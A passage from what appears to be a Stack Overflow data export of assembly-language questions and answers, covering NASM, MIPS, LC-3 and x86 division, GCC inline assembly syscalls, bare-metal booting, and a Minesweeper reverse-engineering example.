","<p>NASM memory operands use square brackets to denote dereferencing.  So for example you will want:</p>

<pre><code>    mov al, [HNUM]
    div byte [D]
    mov [HNUM], al
</code></pre>

<p>The <a href=""http://www.nasm.us/doc/nasmdoc3.html"" rel=""nofollow"">NASM Manual</a> explains this. RTFM!</p>

<p>Without the brackets, the labels are treated as immediate operands equal to the address of the memory location.  The first line is no syntax error, but causes <code>al</code> to be loaded with the low byte of the address of <code>HNUM</code>. Not what you wanted. The <code>div</code> is an error because 8086 has no instruction to divide by an immediate quantity. And the <code>mov</code> is nonsense because you can't write to an immediate value.</p>

<p>So the error messages are telling you what's wrong. In the lines referenced, the operands do not comport with their instructions.</p>

<p><strong>Addition</strong></p>

<p>I went ahead and installed dosbox and NASM.  Indeed NASM is not quite as smart as MASM about inferring operand types.  So for the <code>div</code> instruction you need <code>byte</code>, (not <code>word</code>) as now reflected above.  I could not grok your algorithm.  It's more complicated than necessary.  Here is my version:</p>

<pre><code>; This program gets a hex digit from user and prints it out as a decimal 

        org 100h        ; program start point

section .data

msgIn:  DB      13, 10, ""Enter a hex digit or q to quit: $""
msgErr: DB      "" isn't hex. Must be 0-9, A-F, or a-f.$""
msgOut: DB      "" has decimal value $""
buffer: DB      ""xxxxx""
endBuf: DB      "".$""
ten:    DB      10

section .text

continue:               ; start user interaction
        mov dx, msgIn   ; offset address of message to display
        mov ah, 9       ; print string function
        int 21h

get_hex_digit:
        mov ah, 1
        int 21h         ; read character into al

check_for_quit:
        cmp al, 'q'     ; handle quit character
        je exit
        cmp al, 'Q'
        je exit

check_for_digit:
        cmp al, '0'     ; handle 0-9
        jl check_for_upper
        cmp al, '9'
        jg check_for_upper
        sub al, '0'     ; convert to numeric value
        jmp print_decimal

check_for_upper:
        cmp al, 'A'     ; handle A-F
        jl check_for_lower
        cmp al, 'F'
        jg check_for_lower
        sub al, 'A'-10  ; convert to numeric value
        jmp print_decimal

check_for_lower:
        cmp al, 'a'     ; handle a-f
        jl handle_digit_error
        cmp al, 'f'
        jg handle_digit_error
        sub al, 'a'-10  ; convert to numeric value

print_decimal:          ; print al contents as decimal 0-255
        mov di, endBuf  ; set buffer pointer to char after digits
next_digit:
        dec di          ; advance buffer pointer to next char
        xor ah, ah      ; clear high byte of ax for division
        div byte [ten]  ; ah = ax % 10, al = ax / 10
        add ah, '0'     ; convert ah to ascii
        mov [di], ah    ; copy to buffer
        or al, al       ; set condition codes with al
        jnz next_digit  ; jump if more digits to print

print_digits:
        mov dx, msgOut  ; offset address of message preamble
        mov ah, 9       ; print string function
        int 21h
        mov dx, di      ; offset address of converted digits
        mov ah, 9       ; print string function
        int 21h

        jmp continue    ; otherwise, get next input

handle_digit_error:
        mov dx, msgErr  ; offset address of message to display
        mov ah, 9       ; print string function
        int 21h
        jmp continue

exit:                   ; exit program
        mov ah, 4ch     ; exit to DOS function
        int 21h         ; see you later!
</code></pre>
","21870917"
"MIPS how can you compare a character taken from input?","13894","","<p>My program asks the user if the number he/she is thinking of is in a list. The user inputs a y or an n. How can I check if a user has entered y or n in assembly? Is it sufficient to put the user input into a register and branch if equal to 121 (decimal ASCII code for 'y') or branch if the value is equal to 110 (decimal ASCII code for 'n'?</p>

<p>Thanks in advance</p>
","<p>One can use the system call code for Read Character, which should be system call code 12, then the character (binary ASCII code) will be stored in $v0. Then you can make a register equal to 121 and another to 110. Then branch if equal.</p>

<p>SPIM system call codes:
<a href=""http://www.doc.ic.ac.uk/lab/secondyear/spim/node8.html"" rel=""nofollow noreferrer"">http://www.doc.ic.ac.uk/lab/secondyear/spim/node8.html</a></p>
","1555894"
"Fast divisibility tests (by 2,3,4,5,.., 16)?","13831","","<p>What are the fastest divisibility tests? Say, given a little-endian architecture and a 32-bit signed integer: how to calculate very fast that a number is divisible by 2,3,4,5,... up to 16?</p>

<p>WARNING: given code is EXAMPLE only. Every line is independent! Just obvious solution using modulo operation is slow on many processors, which don't have DIV hardware (like many ARMs). Some compilers are also cannot make such optimizations (say, if divisor is a function's argument or is dependent on something).</p>

<pre><code>Divisible_by_1 = do();
Divisible_by_2 = if (!(number &amp; 1)) do();
Divisible_by_3 = ?
Divisible_by_4 = ?
Divisible_by_5 = ?
Divisible_by_6 = ?
Divisible_by_7 = ?
Divisible_by_8 = ?
Divisible_by_9 = ?
Divisible_by_10 = ?
Divisible_by_11 = ?
Divisible_by_12 = ?
Divisible_by_13 = ?
Divisible_by_14 = ?
Divisible_by_15 = ?
Divisible_by_16 = if(!number &amp; 0x0000000F) do();
</code></pre>

<p>and special cases:</p>

<pre><code>Divisible_by_2k = if(number &amp; (tk-1)) do();  //tk=2**k=(2*2*2*...) k times
</code></pre>
","<p>It is not a bad idea AT ALL to figure out alternatives to division instructions (which includes modulo on x86/x64) because they are very slow. Slower (or even much slower) than most people realize. Those suggesting ""% n"" where n is a variable are giving foolish advice because it will invariably lead to the use of the division instruction. On the other hand ""% c"" (where c is a constant) will allow the compiler to determine the best algorithm available in its repertoire. Sometimes it will be the division instruction but a lot of the time it won't.</p>

<p>In <a href=""http://gmplib.org/~tege/x86-timing.pdf"">this document</a> Torbjörn Granlund shows that the ratio of clock cycles required for unsigned 32-bit mults:divs is 4:26 (6.5x) on Sandybridge and 3:45 (15x) on K10. for 64-bit the respective ratios are 4:92 (23x) and 5:77 (14.4x).</p>

<p>The ""L"" columns denote latency. ""T"" columns denote throughput. This has to do with the processor's ability to handle multiple instructions in parallell. Sandybridge can issue one 32-bit multiplication every other cycle or one 64-bit every cycle. For K10 the corresponding throughput is reversed. For divisions the K10 needs to complete the entire sequence before it may begin another. I suspect it is the same for Sandybridge.</p>

<p>Using the K10 as an example it means that during the cycles required for a 32-bit division (45) the same number (45) of multiplications can be issued and the next-to-last and last one of these will complete one and two clock cycles after the division has completed. A LOT of work can be performed in 45 multiplications.</p>

<p>It is also interesting to note that divs have become less efficient with the evolution from K8-K9 to K10: from 39 to 45 and 71 to 77 clock cycles for 32- and 64-bit.</p>

<p>Granlund's <a href=""http://gmplib.org/~tege/"">page</a> at gmplib.org and at the <a href=""http://www.nada.kth.se/~tege/"">Royal Institute of Technology</a> in Stockholm contain more goodies, some of which have been incorporated into the gcc compiler.</p>
","6912571"
"How to run a program without an operating system?","13830","","<p>How do you run a program all by itself without an operating system running?</p>

<p>Can you create assembly programs that the computer can load and run at startup, e.g. boot the computer from a flash drive and it runs the program that is on the drive?</p>
","<blockquote>
  <p>How do you run a program all by itself without an operating system running?</p>
</blockquote>

<p>You place your binary code to a place where processor looks for after rebooting (e.g. address 0 on ARM).</p>

<blockquote>
  <p>Can you create assembly programs that the computer can load and run at startup ( e.g. boot the computer from a flash drive and it runs the program that is on the drive)?</p>
</blockquote>

<p>General answer to the question: it can be done.
It's often reffered to as ""bare metal programming"".
To read from flash drive, you want to know what's USB, and you want to have some driver to work with this USB. The program on this drive would also have to be in some particular format. On some particular filesystem... This is something that usually boot loaders do.
Many ARM boards let you do some of those things. Some have boot loader to help you with basic setup.</p>

<p><a href=""https://www.cl.cam.ac.uk/projects/raspberrypi/tutorials/os/"">Here</a> you may find great tutorial of how to do basic operating system on Raspberry PI.</p>

<p>Edit:
This article, and the whole wiki.osdev.org will anwer most of your questions
<a href=""http://wiki.osdev.org/Introduction"">http://wiki.osdev.org/Introduction</a></p>

<p>Also, if you don't want to experiment directly on hardware, you can run it as a virtual machine using hypervisors like qemu. See how to run ""hello world"" directly on virtualized ARM hardware <a href=""http://balau82.wordpress.com/2010/02/28/hello-world-for-bare-metal-arm-using-qemu/"">here</a>.</p>
","22054750"
"Return value of a C function to ASM","13815","","<p>I'm trying to call a function from within ASM. I know how to call it, but i'm having trouble finding how to get the return value of this function. An example follows:</p>

<p><strong>C code:</strong>  </p>

<pre><code>int dummy() {  
    return 5;  
}  
</code></pre>

<p><strong>(N)ASM code:</strong>  </p>

<pre><code>dummyFunction:
    call dummy
    ;grab return into eax
    inc eax ; eax should be 6 now
    ret  
</code></pre>

<p>Any ideas?</p>
","<p>The return value is in <code>eax</code>. If you've called a C function from asm, you can read the return value from <code>eax</code>. If you're trying to return from an asm function to C, store the intended return value in <code>eax</code>.</p>

<p>Things get a little bit more complicated for returning floating point values, <code>long long</code> values, or structures, so ask if you need that and someone (maybe me) will help you.</p>
","6171209"
"Equivalent of InterlockedIncrement in Linux/gcc","13785","","<p>It would be a very simple question (could be duplicated), but I was unable to find it.</p>

<p>Win32 API provides a very handy set of atomic operations (as intrinsics) such as <code>InterlockedIncrement</code> which emits <code>lock add</code> x86 code. Also, <code>InterlockedCompareExchange</code> is mapped to <code>lock cmpxchg</code>.</p>

<p>But, I want to do that in Linux with gcc. Since I'm working 64-bit, it's impossible to use inline assembly. Are there intrinsics for gcc?</p>
","<p><a href=""http://gcc.gnu.org/onlinedocs/gcc-4.4.3/gcc/Atomic-Builtins.html#Atomic-Builtins"" rel=""noreferrer"">GCC Atomic Built-ins</a></p>
","2125948"
"How do I correctly use the mod operator in MIPS?","13783","","<p>In MIPS, I am confused on how to get the mod to work. Below is the code I have come up with thus far. I may have more errors besides the mod, but I feel those errors are a result of the mod misunderstanding. All I'm trying to do is to get the working code (python) here:</p>

<pre><code>i = 1
k = 0
while i &lt; 9:
if i % 2 != 0:
    k = k + i
i += 1
print(k)
</code></pre>

<p>to be correctly translated into MIPS. This is my first shot at assembly, so there may be more than mod errors that are tripping me up in the code below:</p>

<pre><code># Takes the odd integers from 1 to 9, adds them,
#  and spits out the result.
# main/driver starts here
    .globl main

main:

#data segment
.data

Li:     .byte 0x01  # i = 1
Lj:     .byte 0x09  # j = 9
Lk:     .byte 0x00  # k = 0
Ltwo:   .byte 0x02  # 2 for mod usage

# text segment
.text

lb $t0, Li      # temp reg for i
lb $t1, Lj      # j
lb $t2, Lk      # k
lb $t3, Ltwo        # 2

L1:  beq $t0, $t1, L2   # while i &lt; 9, compute
     div $t0, $t3       # i mod 2
     mfhi $t6        # temp for the mod
     beq $t6, 0, Lmod   # if mod == 0, jump over to L1
     add $t2, $t2, $t0  # k = k + i
Lmod:    add $t0, $t0, 1        # i++
     j L1           # repeat the while loop


L2: li $v0, 1       # system call code to print integer
lb $a0, Lk      # address of int to print
syscall

li $v0, 10
syscall
</code></pre>
","<p>You are viewing SPIM registers in hex. Hexadecimal 10 is decimal 16.</p>
","21696806"
"What is pseudo-op in assembly programming?","13742","","<p>What is pseudo-op in assembly programming?</p>

<p>I read a statement at <a href=""http://publib.boulder.ibm.com/infocenter/aix/v7r1/index.jsp?topic=/com.ibm.aix.aixassem/doc/alangref/assembler_passes.htm"" rel=""nofollow"">this page</a>:</p>

<p><em>""If a particular symbol appears in the source code, but is not found in the symbol table, then the symbol was never defined. That is, the assembler did not encounter the symbol in the label field of any of the statements scanned during the first pass, or the symbol was never the subject of a .comm, .csect, .lcomm, .sect, or .set <strong>pseudo-op</strong>.""</em></p>
","<p>Pseudo op stands for ""pseudo operation"" and is sometimes called ""assembler directive"". These are keywords which do not directly translate to a machine instruction. Examples are the ones mentioned in your questions or .data, .def, .desc, .dim, .double, .eject, .else, .elseif, .end and many more. Refer to your assembler manual.</p>
","9211296"
"lc3 LDR instruction and the value stored","13708","","<p>I can't figure out why <code>After instruction “LDR R3, R0, 2” is executed, the value stored in R3 is x370C.</code> what does 2 stands for in this instruction? It doesn't look like an immidiate value. I understand that R0 contains x370C at this point. Can someone please help? Many thanks!</p>

<pre><code>.ORIG X3700
 LEA R0, A
 LDI R2, C 
 LDR R3, R0, 2 
 AND R1, R1, #0 
 IN
 ST R0, D 
 JSR  F 
 HALT
 F LD  R1, B
 ADD R1, R1, #1
 BRp F 
 RET

 A .FILL X1234
 B .FILL X370B
 C .FILL X370C
 D .BLKW 2
 E .STRINGZ ""ABCD""
 G .FILL X1234
 .END
</code></pre>
","<p>The second parameter is the offset of the base address that will be loaded. </p>

<p>I started to take some pictures to post here and make a good explanation but I found an interesting lecture video that will explain much better than words and will save a lot of time.</p>

<p><a href=""https://www.youtube.com/watch?v=cDaPPXyYbH0"" rel=""nofollow"">LC3 Instructions - LD, LDR, LDI, LEA</a></p>

<p>The video is explaining the differences between the load instructions for the LC3, highlighting the differences between them.</p>

<p>In your example:</p>

<p>You have your data:</p>

<pre><code>A .FILL X1234
B .FILL X370B
C .FILL X370C
</code></pre>

<p>Running your code:</p>

<pre><code>LEA R0, A      -- R0 has the address of A
LDI R2, C      -- R2 has value of which address C has
LDR R3, R0, 2  -- R3 has the value of C 
               -- because R0 has the address of A + 2 positions = C
</code></pre>
","25868615"
"2D array in assembly","13694","","<p>I defined in the data section an 2d array and two 1d arrays (one for column sum and one for row sum) and i wrote a function that sum the 2d array into the 1d array.
I'm using both eax and ebx as indexes to the 2d array but my program fail when eax or ebx becase 1 and trying to access to unknown address in the memory.
how can i fix the access to the memory in this line:</p>

<pre><code>mov edx,[ebp+columnsSumArray+type dword*ebx]
</code></pre>

<p>this is my program:</p>

<pre><code>    .386
.MODEL flat,stdcall
.STACK 4096
extern ExitProcess@4:Near

.data                  ;Data area 
array2D     Dword 1,2,3,4           ; 3 Rows by 4 Columns
            Dword 5,6,7,8
            Dword 9,10,11,12

rowSumArray Dword 1,1,1             ; two sum init array's
columnSumArray Dword 1,1,1,1

.code                 ;Code area
_main:

    mov eax,offset columnSumArray
    push offset columnSumArray
    push offset rowSumArray
    push 4
    push 3
    push offset array2D

    call Sum2DimArray


    push    0                       ;Black box. Always terminate
    call    ExitProcess@4          ;program with this sequence


;----------------------------------------------------------------   
; Name: Sum2DimArray
; Input: 2d array pointer, rows, columns, rowSumArray, columnSumArray, 
; Description: this function sum the rows item in the 2d array and put it in the rowSumArray,
;              and sum the columns and put it in the columnSumArray
;----------------------------------------------------------------
Sum2DimArray PROC

    ParamSize = 5*4
    matrixAddress = 8
    rowsNumPlace = matrixAddress + 4
    columnsNumPlace = rowsNumPlace + 4
    rowsSumArray = columnsNumPlace + 4
    columnsSumArray = rowsSumArray + 4

    push ebp                            ; using the ebp as function variables pointer
    mov ebp,esp

    push ecx
    push eax
    push ebx
    push esi                            ; 2d array item pointer 
    push edx                    

    mov eax,0                           ; rows counter
    mov ebx,0                           ; columns counter

    mov esi,[ebp+matrixAddress]         ; esi points on the first 2d array value

    RowsLoop:                           ; rows loop
        mov ebx,0
        ColumnsLoop:                    ; columns loop

            mov ecx,[esi]               ; ecx is the current value

            mov edx,[ebp+rowsSumArray+type dword*eax]
            add [edx],ecx
            mov edx,[ebp+columnsSumArray+type dword*ebx]
            add [edx],ecx

            inc ebx
            add esi,sizeof Dword
            cmp ebx,[ebp+columnsNumPlace]
            jne ColumnsLoop

        inc eax
        cmp eax,[ebp+rowsNumPlace]
        jne RowsLoop

    pop edx
    pop esi
    pop ebx
    pop eax
    pop ecx
    pop ebp
    ret ParamSize

Sum2DimArray ENDP

end   _main              ;End of program. Label is the entry point.
</code></pre>
","<p>You are adding the offset for the sum arrays in the wrong place.</p>

<pre><code>mov edx,[ebp+rowsSumArray+type dword*eax]
add [edx],ecx
mov edx,[ebp+columnsSumArray+type dword*ebx]
add [edx],ecx
</code></pre>

<p>Should read:</p>

<pre><code>mov edx,[ebp+rowsSumArray]
add [edx+type dword*eax],ecx
mov edx,[ebp+columnsSumArray]
add [edx+type dword*ebx],ecx
</code></pre>

<p>That is you should first load the pointer from the stack at a known offset from <code>ebp</code>, then add the offset for the required element.</p>
","4657646"
"Creating A GUI from scratch in c++ or assembly","13690","","<p>I have had numerous bad experiences with GUI library</p>

<p>so I would like to know how to create a window from scratch in c++
I am not talking about win32, what I mean is basically create it myself without any external library</p>

<p>is there any way to maybe use a picture or something to create a window
yes I know how hard this will be.</p>

<p>also I read somewhere that library could be made for c++ in assembly</p>

<p>is there a way to create a custom gui in assembly or c++</p>

<p>EDIT:
I am aiming at just windows</p>

<p>PS: another reason I want to learn how to do this is because</p>

<p>I might want to actually create an OS. so I would want GUI with that...</p>
","<p>In order to create a window you'll need to interface with whatever windowing system is currently present on your operating system.  This will either require system calls if the window manager runs in kernel space (as is the case in Windows) or some sort of interprocess communication for user space window managers (like X).  To create the window from scratch, you'll need to read up on how these window managers work and what protocols they use.  In the case of X, it shouldn't be too hard to find resources on how the protocol works.  In the case of Windows, your only option might be to use the API, since the internals of the window manager are proprietary.</p>
","4588425"
"gedit syntax highlighting for assembler files (*.asm)","13656","","<p>By default, gedit doesn't syntax highlight <code>.asm</code> files.</p>

<p>How can I add this support for this language?</p>
","<p>The following steps should be enough.</p>

<pre><code>wget http://www.carminebenedetto.net/_downloads/asm-intel.lang
sudo cp asm-intel.lang /usr/share/gtksourceview-3.0/language-specs/
</code></pre>

<p>Note that the exact folder to copy the <code>.lang</code> file to depends upon your version. You may have <code>gtksourceview-2.0</code> instead, or even something else. On my machine I had both 2.0 and 3.0, and copied the file into each one's <code>language-specs</code> subfolder.</p>
","17003402"
"How to use the div instruction to find remainder in x86 assembly?","13553","","<pre><code>mov eax, 0
mov ebx, 0
mov edx, 0
mov ax, 31
mul cx
mov bx, 12
div bx
add bp, ax
mov eax, 0
mov ebx, 0
mov bp, bp
mov al, 7
div al
</code></pre>

<p>can anyone tell me whats wrong with the div al instruction in this block of code, so as I'm debugging every number of bp i calculated, when i divide by al it give me 1 as the remainder, why is this happen? </p>

<p>the remainder should be store back to ah register </p>

<p>thank in advance </p>

<p>edited code :</p>

<pre><code>mov eax, 0
mov ebx, 0
mov edx, 0
mov ax, 31
mul cx
mov bx, 12
div bx
add bp, ax
mov eax, 0
mov ebx, 0
mov ax, bp
mov bl, 7
div bl
mov al, 0
</code></pre>
","<p>edited code:</p>

<pre><code>mov eax, 0
mov ebx, 0
mov ax, 31
mul cx
mov bx, 12
div bx
add bp, ax
mov eax, 0
mov ebx, 0
mov edx, 0
mov ax, bp
mov bx, 7
div bx
mov esi, edx 
mov eax, 0
</code></pre>
","16404753"
"What does subl do here?","13552","","<p>So... I'm compiling into assembler, with gcc -S -O2 -m32:</p>

<pre><code>void h(int y){int x; x=y+1; f(y); f(2); }
</code></pre>

<p>And it gives me the following:</p>

<pre><code>.file   ""sample.c""
.text
.p2align 4,,15
.globl h
.type   h, @function
 h:
pushl   %ebp
movl    %esp, %ebp
subl    $24, %esp
movl    8(%ebp), %eax
movl    %eax, (%esp)
call    f
movl    $2, 8(%ebp)
leave
jmp f
.size   h, .-h
.ident  ""GCC: (GNU) 4.4.3 20100127 (Red Hat 4.4.3-4)""
.section    .note.GNU-stack,"""",@progbits
</code></pre>

<p>Now I know what pushl and movel: they store the current frame pointer onto the stack and then set the value of the frame pointer register to the value of the Stack Pointer.</p>

<ol>
<li>But I have no idea what the <strong>subl $24, %esp</strong> is. I understood that it moves the stack pointer down by 24 bytes. Correct?</li>
<li>What is immed by the way?</li>
<li>Why does <strong>movl 8(%ebp), %eax</strong>  use 8? Is it 8 bytes? Is this to accommodate for return value + argument <strong>y</strong> to h? Or am I completely off here. So this means look back 8 bytes from the stack pointer?</li>
<li>What does <strong>movl $2, 8(%ebp)</strong> do? It copies contant 2 to the location 8 bytes before the frame pointer. Did the frame pointer change when we called f? If yes - then 8(%ebp) points to the argument location for f.</li>
<li>What does leave do? How can it ""remove"" a stack frame? I mean you cant just remove a piece of memory. In the doc it says it does <strong>mov(esp, ebp), pop ebp</strong>.</li>
</ol>

<p>Thanks!</p>
","<p>The compiler is reserving space on the stack for locals and whatever other needs it might have.  I'm not sure offhand why it's reserving 24 bytes (it doesn't seem to need or use it all).</p>

<p>When calling function <code>f()</code>, instead of using a push instruction to put the parameter on the stack, it uses a simple <code>movl</code> to the last location it reserved:</p>

<pre><code>movl    8(%ebp), %eax    ; get the value of `y` passed in to `h()`
movl    %eax, (%esp)     ; put that value on the stack for call to `f()`
</code></pre>

<p>A more interesting (in my opinion) thing happening here is how the compiler is handling the call to <code>f(2)</code>:</p>

<pre><code>movl    $2, 8(%ebp)      ; store 2 in the `y` argument passed to `h()`
                         ;     since `h()` won't be using `y` anymore
leave                    ; get rid of the stackframe for `h()`
jmp f                    ; jump to `f()` instead of calling it - it'll return
                         ;     directly to whatever called `h()`
</code></pre>

<hr>

<p>To answer your question, ""immed by the way?"" - that is what the instruction reference uses to indicate that the value is encoded in the instruction opcode instead of coming somewhere else like a register or memory location.</p>
","2465244"
"How to change the eflags register value in GDB?","13545","","<p><code>set $eflags</code> does not change <code>eflags</code> value.</p>

<p>The old <code>eflags</code> value remains after eg. <code>=&gt;$set $eflag=0x243</code> [this is just an example input].</p>

<p>Alternatively, is there any way to set individual flags of <code>eflags</code>?</p>

<p>I'm looking for something like: <code>set ZF[zero flag]</code>. Is there a gdb command to do that?</p>
","<pre><code>set ($eflags)=0x243
</code></pre>

<p>worked in my tests for any hex value.</p>
","15479399"
"Just finished learning x86 assembly language. What can I do with it?","13537","","<p>I just finished learning assembly language. But I couldn't understand what could I implement (for practice/like small project). Would be great if its something useful for anyone.</p>
","<p>One of my favorite hobbies is Reverse Engineering.  </p>

<p>It requires a solid knowledge of assembly and the use of disassemblers/debuggers to walk through compiled code.  This allows you to alter, understand and reverse compiled programs.  Each new program is like a puzzle waiting to be solved!</p>

<p>For example, a lot of people reverse games like Minesweeper when they are first starting out.  </p>

<p>Here is a screenshot of a key section of code in Minesweeper I reversed awhile back (comments on right-hand side):
<img src=""https://imgur.com/bFrcA.png"" alt=""alt text""></p>

<p>This was located by placing a breakpoint on calls to the <code>rand()</code> function and stepping backwards in the callstack.  After some digging it becomes obvious that:</p>

<ol>
<li>Minefield Height is located in 0x1005338</li>
<li>Minefield Width is located in 0x1005334</li>
<li>Minefield Baseaddress is located at 0x1005340</li>
</ol>

<p>With this knowledge it becomes easy to determine the location of any given mine in the minefield by:</p>

<pre><code>cellAddress = mapBaseAddress + (32 * (y+1)) + (x+1);
</code></pre>

<p>Then, with a simple loop and some calls to <code>ReadProcessMemory()</code> you've got the ultimate Minesweeper hack!</p>

<p>Reading hand-written assembly is far easier than reading machine generated assembly.  Modern compilers do some magical and crazy things to the code for optimization that can sometimes be difficult to follow.  So, this will definitely push your assembly knowledge!</p>

<p>There are tons of activities that can branch off from this:</p>

<ol>
<li>Reverse hidden API's in libraries</li>
<li>Write advanced game hacks using DLL Injection, Code Caves, Function Hooking and more!</li>
<li>Understand the limitations of various protection schemes employed by software</li>
<li>Reverse a fileformat that isn't published or known and write code to read this format for interoperability purposes.</li>
<li>Write emulators for various systems (including older game systems!)</li>
<li>Understand how a well-known program does a particular task.</li>
<li>Reverse malware and viruses to see how and what they do.  </li>
</ol>

<p>And more!</p>

<p>If you are interested, I highly suggest the book: <a href=""http://rads.stackoverflow.com/amzn/click/0764574817"" rel=""noreferrer"">Reversing: Secrets of Reverse Engineering</a></p>
","1810220"
"How are mutex and lock structures implemented?","13507","","<p>I understand the concept of locks, mutex and other synchronization structures, but how are they implemented?  Are they provided by the OS, or are these structures dependent on special CPU instructions for the CPUs MMU?  </p>
","<p>You may want to look at these links, but the main one is the Test-and-set on Wikipedia: 
<a href=""http://en.wikipedia.org/wiki/Test-and-set"" rel=""nofollow noreferrer"">http://en.wikipedia.org/wiki/Test-and-set</a></p>

<p><a href=""https://stackoverflow.com/questions/1485924/how-are-mutexes-implemented"">How are mutexes implemented?</a></p>

<p>You can also look at this patent:
<a href=""http://www.faqs.org/patents/app/20080222331"" rel=""nofollow noreferrer"">http://www.faqs.org/patents/app/20080222331</a></p>
","1726744"
"Using Inline Assembly in C/C++","13489","","<p>I'm trying to use inline assembly...
I read this page <a href=""http://www.codeproject.com/KB/cpp/edujini_inline_asm.aspx"" rel=""nofollow"">http://www.codeproject.com/KB/cpp/edujini_inline_asm.aspx</a> but I can't understand the parameters passing to my function.</p>

<p>I'm writing a C write example.. this is my function header:</p>

<pre><code>write2(char *str, int len){
}
</code></pre>

<p>And this is my assembly code:</p>

<pre><code>global write2
write2:
    push ebp
    mov ebp, esp
    mov eax, 4      ;sys_write
    mov ebx, 1      ;stdout
    mov ecx, [ebp+8]    ;string pointer
    mov edx, [ebp+12]   ;string size
    int 0x80        ;syscall
    leave
    ret
</code></pre>

<p>What do I have to do pass that code to the C function... I'm doing something like this:</p>

<pre><code>write2(char *str, int len){
    asm ( ""movl 4, %%eax;""
          ""movl 1, %%ebx;""
          ""mov %1, %%ecx;""
          //""mov %2, %%edx;""
          ""int 0x80;""
           :
           : ""a"" (str), ""b"" (len)
    );
}
</code></pre>

<p>That's because I don't have an output variable, so how do I handle that?
Also, with this code:</p>

<pre><code>global main
main:
    mov ebx, 5866       ;PID
    mov ecx, 9      ;SIGKILL
    mov eax, 37     ;sys_kill
    int 0x80        ;interruption
    ret 
</code></pre>

<p>How can I put that code inline in my code.. so I can ask for the pid to the user.. like this..
This is my precode</p>

<pre><code>void killp(int pid){
    asm ( ""mov %1, %%ebx;""
          ""mov 9, %%ecx;""
          ""mov 37, %%eax;""
           :
           : ""a"" (pid)         /* optional */
    );
}
</code></pre>
","<p>Well, you don't say specifically, but by your post, it appears like you're using gcc and its inline asm with constraints syntax (other C compilers have very different inline syntax).  That said, you probably need to use AT&amp;T assembler syntax rather than Intel, as that's what gets used with gcc.</p>

<p>So with the above said, lets look at your write2 function.  First, you don't want to create a stack frame, as gcc will create one, so if you create one in the asm code, you'll end up with two frames, and things will probably get very confused.  Second, since gcc is laying out the stack frame, you can't access vars with ""[ebp + offset]"" ad you don't know how its being laid out.  That's what the constraints are for -- you say what kind of place you want gcc to put the value (any register, memory, specific register) and the use ""%X"" in the asm code.  Finally, if you use explicit registers in the asm code, you need to list them in the 3rd section (after the input constraints) so gcc knows you are using them.  Otherwise it might put some important value in one of those registers, and you'd clobber that value.</p>

<p>So with all that, your write2 function looks like:</p>

<pre><code>void write2(char *str, int len) {
    __asm__ volatile (
        ""movl $4, %%eax;""
        ""movl $1, %%ebx;""
        ""movl %0, %%ecx;""
        ""movl %1, %%edx;""
        ""int $0x80""
        :: ""g"" (str), ""g"" (len)
        : ""eax"", ""ebx"", ""ecx"", ""edx"");
}
</code></pre>

<p>Note the AT&amp;T syntax -- src, dest rather than dest, src and <code>%</code> before the register name.</p>

<p>Now this will work, but its inefficient as it will contain lots of extra movs.  In general, you should NEVER use mov instructions or explicit registers in asm code, as you're much better off using constraints to say where you want things and let the compiler ensure that they're there.  That way, the optimizer can probably get rid of most of the movs, particularly if it inlines the function (which it will do if you specify -O3).  Conveniently, the i386 machine model has constraints for specific registers, so you can instead do:</p>

<pre><code>void write2(char *str, int len) {
    __asm__ volatile (
        ""movl $4, %%eax;""
        ""movl $1, %%ebx;""
        ""int $0x80""
        :: ""c"" (str), /* c constraint tells the compiler to put str in ecx */
           ""d"" (len)  /* d constraint tells the compiler to put len in edx */
        : ""eax"", ""ebx"");
}
</code></pre>

<p>or even better</p>

<pre><code>void write2(char *str, int len) {
    __asm__ volatile (""int $0x80""
        :: ""a"" (4), ""b"" (1), ""c"" (str), ""d"" (len));
}
</code></pre>

<p>Note also the use of <code>volatile</code> which is needed to tell the compiler that this can't be eliminated as dead even though its outputs (of which there are none) are not used.</p>

<p><strong>edit</strong></p>

<p>One final note -- this function is doing a write system call, which does return a value in eax -- either the number of bytes written or an error code.  So you can get that with an output constraint:</p>

<pre><code>int write2(char *str, int len) {
    __asm__ (""int $0x80"" : ""=a"" (len) : ""a"" (4), ""b"" (1), ""c"" (str), ""d"" (len));
    return len;
}
</code></pre>

<p>With a real output, you may or may not want the volatile -- not having it will allow the compiler to dead-code eliminate the write if the return value is not used.  But you always check the return value for errors, right?</p>
","5131822"
"MIPS User input integers into array then printing them out","13473","","<p>Hello I have been practicing writing assembly language and I have been working on this seemingly simple code. I want to prompt the user for input then i want to take that input and put it into an array. Then i want to print out the array. I know I can just print them out without putting them in an array but this is just for my practice. Something is just not right though it wont print them back out.</p>

<pre><code>    .data
array:  .space 400
prompt: .asciiz ""Enter an integer (0 to quit) :""
text:   .asciiz ""After sorting, the list of integers is:""
   .text
   .globl main
main:
    la $a1, array

    li $v0, 4
    la $a0, prompt
    syscall

    li $v0, 5
    syscall

    sw $v0, 0($a1)
    addiu $a1, $a1, 4

    beqz $v0, sort
    j main

sort:
    la $a1, $array

    li $v0, 4
    la $a0, text
    syscall

loop:
    lw $t0, 0($a1)
    addiu $a1, $a1, 4

    beqz $t0, done

    li $v0, 1
    move $a0, $t0
    syscall

    j loop

done:
</code></pre>

<p>please help me with what i am doing wrong. Oh and the zero is kind of the sentinal value when i hit a zero that means its the end of the input</p>
","<p>Remember that branch and jump instructions on MIPS have delay slots. That is, the instruction directly following a branch or jump instruction is always executed.<br>
It's possible that your assembler (gas?) is taking care of this for you by inserting <code>NOPs</code> or re-ordering instructions. You could find out by disassembling the binary with objdump. If the assembler <em>doesn't</em> fix this for you, the easiest way to fix it by yourself is to insert a <code>NOP</code> after each branch/jump.</p>

<p>The other thing that stands out is that you always reload <code>$a1</code> with the address of <code>array</code> before you read a new number. This means that every number you read will be stored at <code>array[0]</code>, including the terminating 0. So your print loop will find 0 as the first value in the array and exit immediately.<br>
You could fix that by changing the code to something like this:</p>

<pre><code>main:
la $a1, array
read_numbers:
  # Rest of code omitted for brevity...
  beqz $v0, sort
  j read_numbers
</code></pre>
","15564082"
"Fastest way to calculate a 128-bit integer modulo a 64-bit integer","13438","","<p>I have a 128-bit unsigned integer A and a 64-bit unsigned integer B. What's the fastest way to calculate <code>A % B</code> - that is the (64-bit) remainder from dividing A by B?</p>

<p>I'm looking to do this in either C or assembly language, but I need to target the 32-bit x86 platform. This unfortunately means that I cannot take advantage of compiler support for 128-bit integers, nor of the x64 architecture's ability to perform the required operation in a single instruction.</p>

<p><strong>Edit:</strong></p>

